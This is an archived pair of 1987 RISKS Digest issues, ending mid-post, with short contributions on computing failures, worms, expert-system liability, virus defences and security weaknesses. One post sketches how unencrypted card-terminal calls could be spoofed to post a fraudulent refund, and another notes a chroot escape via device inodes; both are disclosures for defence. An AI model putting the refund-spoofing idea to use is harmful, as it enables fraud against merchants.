<H3><A NAME="subj7.1">
Need for first-person anonymous reporting systems
</A>
</H3>
<address>
Eugene Miya 
&lt;<A HREF="mailto:eugene@ames-nas.arpa">
eugene@ames-nas.arpa
</A>&gt;
</address>
<i>
Mon, 7 Dec 87 09:16:59 PST
</i><PRE>

The Mariner and F4 canopy (not computer related) stories appear to be
indicative of certain types of bureaucracies.  While I investigate the
Mariner story (I have two leads at the moment), I think that it appears to
me that normal academic reporting and publication procedures fail us in
these matters.  Bureaucracies don't like negative subjects to be remembered
(almost, I just remembered today is Dec. 7).

If we are ever going to progress out of the software muck, we are going to
have to come up with mechanisms to replace all of our ancedotal information
with better information.  This has to be separate from any type of watch-dog
enforcement like "Golden Fleeces," ombudsmen or Inspector Generals.  We have
to throw out hearsay.  Perhaps an anonymous Email system (lots of inherent
problems) to a third party? I don't know, but it's something to think about.

--eugene miya

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Apollo 11 computer problems
</A>
</H3>
<address>
Michael MacKenzie
&lt;<A HREF="mailto:mm@purdue.edu ">
mm@purdue.edu 
</A>&gt;
</address>
<i>
Mon, 7 Dec 87 12:11:57 EST
</i><PRE>
To: risks@csl.sri.com

Exerpt from Apollo, Expeditions to the Moon,
Scientific and Technical Information Office, NASA, Washington D.C., 1975

During the landing of Apollo 11

Michael Collins:

At five minutes into the burn (6000 feet above the surface)
... "Program alarm", barks neil, "Its a 1202", what the hell is that?
I don't have the alarm numbers memorized for my own computer, much less
for the LM's  I jerk out my checklist and start thumbing through it, but before
I can find 1202 Houston say, "Roger, we're GO on that alarm" no problem
in other words.  My checklist says 1202 is an "executive overflow" meaning
simply that the computer has been called upon to do too many things at
once and is forced to postpone some of them.  A little farther, at just
3000 feet above the surface the computer flashes 1201, another overflow
condition, and again the ground is superquick to respond with assurances.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Interconnected ATM networks
</A>
</H3>
<address>
&lt;<A HREF="mailto:treese@ATHENA.MIT.EDU">
treese@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Sun, 6 Dec 87 22:22:52 EST
</i><PRE>

[Based on an article in the _Boston_Globe_, 12/5/87, p.1]

In Massachusetts now, there is a great deal of competition for ATM networks.
BayBanks is by far the largest, and many other banks have joined together
in a network to compete with BayBanks in sheer number of machines.  BayBanks
recently joined NYCE, a network of ATM's in New York.  The Bank of Boston
also joined, so now Bank of Boston cards work in BayBanks machines.

When the Globe contacted BayBanks, they refused to acknowledge it until
told that the Globe had photographed an editor actually using a Bank of Boston
card in a BayBanks machine.  Pressed further, a BayBanks spokesperson
admitted that it worked, and said that they didn't know NYCE was active yet.

	Win Treese
	MIT Project Athena

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Litigation over an expert system
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@russell.stanford.edu ">
chapman@russell.stanford.edu 
</A>&gt;
</address>
<i>
Mon, 7 Dec 87 10:28:51 PST
</i><PRE>

I am not an attorney, but I worked as a consultant in product liability cases
for eight years, and I have some comments on the question posed in RISKS about
whether one can sue for damages caused by the use of an expert system.

First, who do you sue?  Answer:  everybody.  As long as the parties mentioned
in the case of a financial analyst expert system are individuals or distinct
corporate entities, they can be sued and they probably will be.  This is why in
large product liability cases the defendants can be numerous--in cases
involving DES, for example, (the drug, not the encryption system) there are
literally hundreds of defendants.  There does not even have to be a real legal
basis for suing a defendant; it becomes incumbent on the defendant to convince
the court that there is no legal basis for the lawsuit in a motion for summary
judgment.  There are even attorneys who specialize in finding defendants who
can be sued--for example, in one case I know about, which involved a high
school football player who had been paralyzed from a tackle injury during a
game, a special attorney was brought in to find potential defendants, and the
plaintiff wound up suing the NCAA, which had drafted the rules for playing
football that were used by the plaintiff's school district.

One of the few ways in which a person or a corporation can be guaranteed
protection from litigation is an indemnity agreement, or indemnity clause in a
contract, which explicitly says that in the event of a lawsuit, one of the
contracting parties will pick up the legal defense of the other, including all
expenses and all judgments.  These are pretty rare.

It is correct to assume that a disclaimer, or a warning, or a "terms of
agreement" document such as is commonly found in software packages, is no
protection against a lawsuit or a judgment against the developer.  It is up to
a judge or jury to decide whether the warning was adequate, whether it was
relevant to the damages, and even whether it was presented to the user in a way
that was likely to have actually "warned" the consumer about the use which
produced the damages.  For example, in a couple of cases I worked on, the
plaintiffs brought in a psychologist who specialized in the visual impact of
signs--she consulted with municipal transportation systems on how to design
signs on subways that would get across essential information, for example.
This psychologist would frequently testify that a warning on a product was
ineffective because of the way it was packaged or designed.  It is hard to
estimate the effect of her testimony on a jury--sometimes the plaintiff won,
sometimes the defense won.  But this is an illustration of what one is likely
to be up against in a case involving large damages.

In another illustration, it often comes up in product liability cases involving
drugs that the warnings issued by drug companies and published in a standard
reference work called the Physicians' Drug Reference, or PDR, are so dense and
so full of information that they no longer convey a "warning" that is
intelligible to anyone.  Nevertheless, if the drug companies fail to include
any particular bit of information then they may be liable for failing to
provide a warning for something they knew about.

A jury may award a defendant a judgment even when there was a warning or a
terms of agreement document.  The defendant may then appeal the judgment based
on a claim that the defendant did everything in his power to avoid the
damages--for example, a lawn mower company put a big, nasty looking warning on
some part of the lawn mower that said don't do such and such because you may
get your hand caught in there and lose some fingers, but the plaintiff did it
anyway and for some reason the jury decided he should get some money from the
defendant.  But appeals are expensive, and it's likely that the defendant and
the plaintiff will settle the case for some dollar figure, and perhaps the
money will be paid by an insurance company.  There is not much one can do to
predict what a jury will decide, even in the most straightforward cases.  I
remember asking one juror why she voted the way she did, and she said that she
understood that she was supposed to give *someone* some money, and she thought
the defendant could pay more than the plaintiff could.  A jury may also decide
that a warning could have been better, but that the plaintiff was also at least
partially responsible for his injury through "contributory negligence," so the
dollar amount of the judgment may be lower because of this.

In California, where I live, there is a goofy law that if one of the defendants
in a multi-party suit is judged to have been responsible in any way, that
defendant is liable for the percentage of responsibility, no matter how small.
In other words, if the jury decides that defendant A is 99% responsible, and
defendant B is only 1% responsible, and the judgment is $10 million, defendant
B has to pay the plaintiff $100,000.

I don't know of any cases of product liability involving damages alleged to
have occured because of the use of an expert system, but the law is likely to
be the same for such cases as it is for any other product liability case.

</PRE>
<HR><H3><A NAME="subj10.2">
re:  Can you sue an expert system
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Mon, 7 Dec 87 10:53 EST
</i><PRE>
To: risks@csl.sri.com

In <A HREF="/Risks/5.69.html">RISKS-5.69</A>, Barry Stevens becomes another in a long line of people to raise
the question "If an expert system gives bad advice, who can I sue?"  I find it
extremely disturbing that this is considered an interesting question by
ANYONE, let alone by technically sophisticated people.  It is a symptom of the
pervasiveness of our misplaced trust in buzzwords and, more generally, in
computers:  If the computer said it, it MUST be right.

We have no idea how to build an expert system with anything you would want to
call "understanding" or "responsibility" - or even "intelligence" - in any but
the most narrow sense.  There is no indication that we will be able to build
such a system any time soon.  An expert system is a clever way of encoding a
textbook and some guidelines.  If well designed, it happens to be a lot easier
to use than the typical textbook - but then again there are good textbooks and
poor textbooks.  It should make no more sense to sue an expert system than it
does to sue a textbook.  It should make no more sense to sue a vendor of
expert systems than it does to sue a publisher or a bookstore because of
inaccurate information in one of the books they sell.  It should make no more
sense to sue the "knowledge engineer" who did the fairly routine work of
organizing data from a group of experts into an expert system than it would to
sue an editor of an encyclopedia.  Finally, it should make no more sense to
sue the expert who contributed to an expert system than it does to sue the
author of an encyclopedia article.

As a general rule, it's almost impossible to sue someone for advice offered
in a book.  You need a much closer relationship with the expert - the expert
has to hold himself up not just as an expert "in general", but as an expert in
your particular problem.  In paying for him to work on your particular prob-
lem, you are creating expectations and obligations that go far beyond what
you can expect from an author of a book.

In our litigious society, someone WILL sue over the advice given by an expert
system.  They'll sue everyone they can.  They may even win, eventually.  If
they do it will be a sign that enough advertising, enough magazine articles,
enough speeches on how "intelligent" expert systems are have been given that
the courts have decided that people are legimately entitled to view this claim
as more than mere "seller's talk".  The first such case to be upheld is likely
to see the death of the expert systems business:  We do not know how to build
expert systems that can come close to living up to the expectations being
raised for them.  No one will be able to afford the resulting liabilities.
From my point of view, if it ever came to that, it would be a result richly
deserved by an industry that has lived on hype.  What disturbs me is that it's
unlikely the legal system, should it ever start on this path, will draw quite
the distinctions we in the business draw between expert systems and other
kinds of applications.  Would you like to be personally liable because the
database program you wrote didn't deal with spelling errors and as a result
someone missed an incorrectly-typed reference in an on-line catalog and was
somehow injured as a result?

There is SO much hype about computers and their miraculous powers, and SO much
of a willingness to believe it on the part of the public, that I think we as
professionals have an obligation to tell people, at every opportunity, just
how limited our real abilities are, and are likely to remain in the forseeable
future.  Speculations about the legal liabilities of AI's are fine as philo-
sophy, but as anything more than speculation about possible futures, they are
uninformed about either the technical or legal realities.  If they lead people
to place their trust in such systems inappropriately, then can be downright
dangerous.
							-- Jerry

</PRE>
<HR><H3><A NAME="subj10.3">
Re: Can you sue an expert system?
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
7 Dec 87 11:49:47 PST (Monday)
</i><PRE>
From: "Bruce_Hamilton.OsbuSouth"@Xerox.COM
To: portal!cup.portal!Barry_A_Stevens@Sun.COM
cc: RISKS@KL.SRI.COM, "Bruce_Hamilton.OsbuSouth"@Xerox.COM

No new law needed here.  I'm a layman, not a legal scholar, but it seems to me
that an "expert system" is precisely analogous to a book.  The only difference
with a book is that you have to do all the "if-then" calculations yourself
("if your net worth according to this formula is &gt; X, then turn to page
Y...").
                                   Bruce

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
What this country needs is a good nickel chroot (Re: <A HREF="/Risks/5.63.html">RISKS-5.63</A>)
</A>
</H3>
<address>
   Bob English 
&lt;<A HREF="mailto:lcc.bob@SEAS.UCLA.EDU">
lcc.bob@SEAS.UCLA.EDU
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 12:33:02 PST
</i><PRE>

&gt; From: "Joseph G. Keane" &lt;jk3k+@andrew.cmu.edu&gt;
&gt; Subject: Re: "UNIX setuid stupidity" (<A HREF="/Risks/5.57.html">RISKS-5.57</A>)
&gt; The designers of UNIX considered that a trusted program may wish to allow 
&gt; operations only on a certain part of the directory tree.  So they provided 
&gt; the `chroot' system call, ...   --Joe

Chroot doesn't work very well.  Since the super-user can create device inodes,
it can access or modify any disk area, regardless of the limitations enforced
by the new root.  'Chroot', by itself, will not prevent a determined invader
from penetrating to the rest of the system.  It does, however, prevent
penetrations based solely on moving through ".."
                                                        --bob--
     [To those of you who contributed on this topic, I STILL have a backlog
     of messages waiting for me to sort out the wheat from the chaff.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.70.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.72.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-24</DOCNO>
<DOCOLDNO>IA012-000130-B022-315</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.72.html 128.240.150.127 19970217014516 text/html 25114
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:43:33 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 72</TITLE>
<LINK REL="Prev" HREF="/Risks/5.71.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.73.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.71.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.73.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 72</H1>
<H2> Saturday, 12 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks to the Rodent Public in the Use of Computers 
</A>
<DD>
<A HREF="#subj1.1">
Peter Ladkin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Yet another virus program announcement fyi 
</A>
<DD>
<A HREF="#subj2.1">
Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  IBM invaded by a Christmas virus 
</A>
<DD>
<A HREF="#subj3.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Virus Protection Strategies 
</A>
<DD>
<A HREF="#subj4.1">
Joe Dellinger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  New chain letter running around internet/usenet 
</A>
<DD>
<A HREF="#subj5.1">
Rich Kulawiec
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  On-line bank credit cards 
</A>
<DD>
<A HREF="#subj6.1">
John R. Levine
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Central Locking 
</A>
<DD>
<A HREF="#subj7.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Product Liability 
</A>
<DD>
<A HREF="#subj8.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Wishing the deceased a merry christmas (automatically)  
</A>
<DD>
<A HREF="#subj9.1">
Bill Lee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Air Traffic Control Computer Replacement Schedule 
</A>
<DD>
<A HREF="#subj10.1">
Dan Ball
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Re: United Airlines O'Hare Sabotage? 
</A>
<DD>
<A HREF="#subj11.1">
Dave Mills
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
`Risks to the Rodent Public in the Use of Computers'
</A>
</H3>
<address>
Peter Ladkin
&lt;<A HREF="mailto:ladkin@kestrel.ARPA ">
ladkin@kestrel.ARPA 
</A>&gt;
</address>
<i>
Fri, 11 Dec 87 11:18:20 PDT
</i><PRE>

  Stray Rodent Halts Nasdaq Computers, by Kenneth N. Gilpin
  NYT Thursday, Dec 10, 1987, p.33
  
  An adventurous squirrel touched off a power failure in Trumbull, Conn.,
  that shut down the National Association of Securities Dealers'
  automatic quotation service for 82 minutes yesterday.
     A Nasdaq official estimated that the power failure might have kept
  slightly more than 20 million shares from being traded. [......]
  The breakdown was also felt at stock exchanges around the country on
  which options on over-the-counter issues are traded
     Power in the Trumbull area, where Nasdaq's main computer center is
  situated, was restored by the United Illuminating Company shortly after
  the squirrel lost its life - and Nasdaq its power - at 10:43 A.M.
     But a power surge that accompanied the utility's resumption of
  service disabled Nasdaq's mainframe computers and seriously damaged the
  electrical system at the complex, making it impossible to use backup
  generators.
     Nasdaq officials then switched to a backup computer system in
  Rockville, Md. By 12:05 P.M., service had been partly restored. 
  Full service was available by 2:30 [the Nasdaq official] said . [......]

Well, I guess a martyr to one segment of the mammal population is a scapegoat
to another. The disruption could have been more serious if more people hadn't
squirrelled away their savings after black monday.
                                                         peter ladkin
  
</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Yet another virus program announcement fyi
</A>
</H3>
<address>
Martin Minow ML3-5/U26 223-9922
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
11 Dec 87 11:55
</i><PRE>

From CRTNET, number 115.  From T3B%PSUVM.BITNET.
 
Subject:      Christmas Virus Warning

If you are at a CMS site and receive a program called CHRISTMA EXEC, please
(a) warn your postmaster and (b) discard the exec (or keep a copy for the
postmaster to look at, but DO NOT RUN IT).  This exec paints a Christmas
tree on your screen and then sends itself to everyone named in either your
NAMES or NETLOG files.  The result is potentially serious stress on Bitnet
and on your local spool system, and possibly a few system crashes here and
there as the number of reader files soars and exceeds the maximum.  The
Christmas tree isn't all that pretty, and the joke is pretty mean.
 
A word to the wise.  Your postmaster will thank you. Michael Sperberg-McQueen

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
IBM invaded by a Christmas virus
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat, 12 Dec 87 10:02:24 EST

  (From the Lafayette (Indiana) Journal &amp; Courier, December 12, 1987.  Quoted
  without permission.)

  IBM Woes -- Computerized grinch jams the mail

     BINGHAMTON, N.Y.- A computerized Grinch invaded IBM's electronic
  mail Friday.
     An illegal software-style so-called Christmas card sent through
  IBM's electronic mail jammed desk-top computer terminals, spokesman
  Joseph E. Dahm said.
     The so-called virus program forced plant officials to turn off
  internal links between computer terminals and mainframe systems to
  purge the message, Dahm said.
     IBM sources say the link was off from 45 minutes to 90 minutes
  depending on the location.
     The program is known as a virus because it enters computer programs
  and replicates itself automatically.
     Curious employees who read the message titles "Christmas" in the
  morning electronic mail discovered an illustration of a Christmas tree
  with "Holiday Greetings" superimposed on it.  A caption advised "Don't
  browse it, it's more fun to run it."
     "That was the hook," an IBM source said.  "A lot of people thought
  they could take a peek and then kill the message, but once opened, it
  was too late."
     The program automatically entered a security log listing contacts
  made from the individual computer terminal, duplicated and mailed
  itself to new victims.
     Like a Pandora's Box, once opened, the program rarely accepted
  commands to stop, sources said.  Operators who turned off their
  terminals to stop the Christmas message lost electronic mail or
  unfinished reports not filed in the computer.

This article seems to have a lot of things in it that the reporter didn't
understand.  I assume that the "terminals" in question are really PC's
connected to the mainframes; for one thing.  Plus, I presume the "Don't
browse it" refers to the VM/CMS "BROWSE" command used for looking through
files, and not just to the regular English word.

Does anyone have any more info from a source which understands all the
big words?
                                  --Dave Curry, Purdue University

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Virus Protection Strategies
</A>
</H3>
<address>
Joe Dellinger 
&lt;<A HREF="mailto:joe@hanauma.STANFORD.EDU">
joe@hanauma.STANFORD.EDU
</A>&gt;
</address>
<i>
Wed, 9 Dec 87 02:22:36 pst
</i><PRE>

	From recent postings it sounds like Personal Computer viruses
are getting to be a problem. In 1982 when I wrote my Virus, nobody I knew
thought such things could even exist. When I explained what I had made to
fellow hacker types, the usual reaction was "What a wonderful idea! But an
innocuous virus is boring. I want to create an EVIL one...". Given this
reaction, and the increasing knowledge of how such things work, I would
expect the number of viruses to increase.

	What strategies can we use to protect ourselves? Best, of course,
is to make it impossible. Make the DOS area on the disk read only. Put DOS
in rom on the machine. Write protect as many disks in your collection as
feasible. Make sure write protection is done in hardware.

	Whenever a new disk is used for the first time, compare the DOS
on that disk with the DOS in memory. If they don't match, issue a warning.
Make a program that performs such a check a standard utility.

	The best solution, I think, is to simply make writing a Virus
difficult. Don't leave any convenient holes in DOS where a Virus can hide
out. Have many places in the boot process where parity checks on pieces of
DOS are done. Have unused bytes scattered here and there in DOS that are
different in every copy of DOS sold. Have code in ROM that performs
some sort of verification before booting a disk. Have several different
versions of this ROM in use, sensitive to different things, so that you
can't assume a virus that works on your machine will also work on all
machines. Use self-modifying code in the boot process. Have several different
ways that DOS can be layed out on the disk, and pick a random one at
initialization time.

While none of these schemes would make a Virus impossible, any of them
would make creating one very tedious. I think the only reason we aren't
experiencing a plague of viruses already is that it is a fair amount of
work to create one. It is also a lot more work to create a "careful" virus
than it is to create a "careless" one. Most of the viruses I have heard
of are not purposefully evil, they just don't bother to check that they
aren't accidentally damaging something.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
New chain letter running around internet/usenet
</A>
</H3>
<address>
Rich Kulawiec
&lt;<A HREF="mailto:rsk@s.cc.purdue.edu ">
rsk@s.cc.purdue.edu 
</A>&gt;
</address>
<i>
Thu, 10 Dec 87 21:37:57 EST
</i><PRE>

Yes, there's another chain letter running around out there.  We've just wiped
out a few hundred local copies, and it looks like it got here after bouncing
around a DECnet site somewhere.  The oldest letter in the chain is from
'DECWSE::ROST "Randi Rost"' but of course I've no idea if that's the original
point of origin.  There's no telling how much mail spooler space or xmit time
is being chewed up by this @($#*&amp;!@ letter, of course; but I figured I'll tell
y'all...well, those of you that didn't already know the good news.
                                                                       Rich
   [Enormous sequential history of the chain letter deleted...  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
On-line bank credit cards
</A>
</H3>
<address>
John R. Levine
&lt;<A HREF="mailto:johnl@ima.ISC.COM ">
johnl@ima.ISC.COM 
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 22:06:30 EST
</i><PRE>

In a recent job, I was involved in processing Master Card and Visa credit
card charges, and it seems to me that their automated processing system is
enormously vulnerable to fraud.  Let me explain how it works.

We were taking a lot of credit card orders over the phone, and had all of
the order information in a data base.  It seemed like a bad idea to print
out zillions of charge slips, so I investigated submitting the charges
on-line.  It turned out to be unbelievably easy.

Readers are doubtless familiar with the verification terminals found next
to cash registers, into which a clerk puts the card, keys in the amount of
the sale, it calls in and comes back with an approval code or denial
message.  It turns out that the terminals can do considerably more than
that.  They can post charges to a customer's bill, making it unnecessary
to physically send in a slip, and can also post refunds.  Many stores use
an "auth/post" transaction which authorizes and posts a charge in a single
operation while you wait.  When the terminal runs the transaction, it
calls a local concentrator which sends the request to the Giant Bank
Computer in Omaha, which in turns sends the request to the cardholder's
bank, with the bank sending back the response.  The authorization code the
merchant writes on the check comes from the cardholder's bank.  I've
watched while requests for European cards ran, and they take only a few
more seconds than usual.  It's pretty impressive.  Funds from transactions
posted by 7:00 PM each day are supposed to be available in the merchant's
bank account the next morning.  The Giant Bank Computer sends a printed
log of posting transactions which usually arrives about a week after the
actual transaction.  Each call that posts anything produces a separate log
page.  The bank, by the way, thinks this is all great since they are
spared all of the physical work of processing the charges, and charged us
about half what they would have had we sent in slips.

The protocol between the authorization terminal and the concentrator is
unencrypted 300 baud ASCII.  It took me about a day to write a program for
a PC that implemented the protocol and that we used to process our
thousands of credit card sales via auth/post transactions.  The terminal
calls in, and after the concentrator answers it sends a record consisting of
the merchant's account number, the customer's account number, the amount
to charge, and a code indicating what kind of transaction to perform.  The
response is the actual string displayed on the transaction terminal, e.g.
"AUTHORIZED: 123456".  The messages in each direction are protected by a
simple one-byte checksum, with messages with bad checksums being ignored.
There is no log-on or log-off protocol; the terminal calls up, sends and
recieves as many transactions as it wants, and then hangs up.

The first problem is that there is no protection against duplicated
transactions when a message is thrown away due to a bad checksum.  We had
a few, most of which we fortunately noticed and fixed before the customer
got the bill, and would probably have had many more had the concentrator
not been physically very close on a clean phone line.  More importantly,
this scheme seems awfully easy to spoof.  Merchant numbers are usually
printed next to the merchant's name on a charge slip.  Card numbers are
all over the place.  For example, imagine that I just bought something at
a store that runs a slip, then does an auth/post on its terminal and then
just files the slip.  (I know lots of stores that do that.)  I then run
home and call up from my PC, sending a refund transaction for the same
amount and merchant number.  The merchant probably would never notice the
refund in the blizzard of paper that comes from the Giant Bank Computer,
or if it did, would probably assume that it was a voided sale or
accidental overcharge.  Another less subtle risk is that were someone to
sabotage the Giant Bank Computer, as far as I can tell all bank card
charges would stop.  I'm sure they have good physical security and
backups, but even a day or two of downtime could cause major trouble for a
lot of merchants.

We probably have yet another case here of banks using security through
obscurity (which is why I'm certainly not going to go into any more detail
about the protocols.)  I've heard that they are very touchy about people
discussing the checksum algorithm used in credit card numbers, even though
the algorithm is printed in the ANSI standard for financial transaction
cards.  The online transaction scheme is, to put it mildly, a much greater
exposure.

American Express was much less willing to automate the procedure -- they
were happy to do on-line authorizations through the same simulated
transaction terminal.  We still had to send in physical charge slips.  I
thought they were just being obnoxious, but upon reflection, I can see
that they may have had their reasons.

John Levine, johnl@ima.isc.com or ima!johnl or Levine@YALE.something

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Central Locking
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mcvax!praxis!mct@uunet.UU.NET">
mcvax!praxis!mct@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 12:09:10 BST
</i><PRE>

A colleague's BMW 525e developed a disturbing fault.  After we had returned
to it on several occasions to find all the doors unlocked, we set a trap.
After parking it, we locked the doors, went 20 yards away and waited.  Five
minutes later, we heard the central 'locking' system unlock all the doors.

The fault was traced to a loose wire.

Martyn Thomas, Praxis plc, 20 Manvers Street, Bath BA1 1PX UK.
Tel:	+44-225-444700.   Email:   ...!uunet!mcvax!ukc!praxis!mct 

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Product Liability
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mcvax!praxis!mct@uunet.UU.NET">
mcvax!praxis!mct@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 12:25:07 BST
</i><PRE>

An EEC Directive, mandatory throughout the Community from Summer 1988,
imposes strict (ie no-fault) liability on manufacturers of products which
cause personal injury or damage to personal property as a result of a
manufacturing defect.  For imported goods, the original importer into the
EEC is liable.

Liability is strict: the purpose of the Directive is to ensure that injured
people can recover damages without having to prove negligence (usually
impossible and always expensive).

The UK has enacted the Directive as Part 1 of the Comsumer Protection Act 1987
(which comes into force on March 1st 1988).  The UK has included a defence:
"that the state of scientific and technical knowledge at the relevant time was
not such that a producer of products of the same description as the product in
question might be expected to have discovered the defect if it had existed in
his products while they were under his control".  This defence is not allowed
in France, the Netherlands, or Luxembourg.  West Germany allows the defence
except for Pharmaceutical products.

It is expected that the Act will greatly increase the adoption of software
Quality Assurance (to conform to ISO standard ISO 9001) and the use of
mathematically rigorous specification and development methods (VDM, Z etc).

Martyn Thomas, Praxis plc, 20 Manvers Street, Bath BA1 1PX UK.
Tel:	+44-225-444700.   Email:   ...!uunet!mcvax!ukc!praxis!mct 

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Wishing the deceased a merry christmas (automatically)
</A>
</H3>
<address>
Bill Lee
&lt;<A HREF="mailto:munnari!phadfa.adfa.oz.au!lee@uunet.UU.NET ">
munnari!phadfa.adfa.oz.au!lee@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Organization: Physics, Australian Defence Force Academy

Text in &lt;&lt; &gt;&gt; was lifted without permission from the
"Sydney Morning Herald" Friday Dec. 11 1987

     &lt;&lt; The Advance Bank sent a Christmas letter to a Manly
	account holder.  It read: "Dear Valued Customer, On
	behalf of your local branch team, may I wish you a
	very safe and happy Christmas 1987, and a prosperous
	1988."  The man died earlier this year - and the
	bank recognised this by addressing the letter to
	Mr Arthur .... Decd. &gt;&gt;

